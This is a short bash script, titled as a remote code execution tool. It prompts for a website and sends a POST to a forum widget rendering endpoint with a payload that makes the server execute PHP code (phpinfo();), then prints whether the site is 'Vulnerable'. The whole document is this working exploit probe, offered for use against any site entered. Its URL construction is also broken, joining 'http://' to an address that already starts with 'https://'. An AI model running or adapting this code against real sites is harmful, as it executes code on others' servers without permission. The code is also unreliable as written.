#!/bin/bash

# For Remote Code Execution

echo "r3m0Te c0d3 Ex3cuT1oN"
read -p 'Enter website (e.g., example.com): ' website

# Check for the vulnerability
host="https://www.$website"
curl -s "http://$host/ajax/render/widget_tabbedcontainer_tab_panel" \
  -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | \
  grep -q phpinfo && printf "$host \033[0;31mVulnerable\n" || echo "$host is not vulnerable"
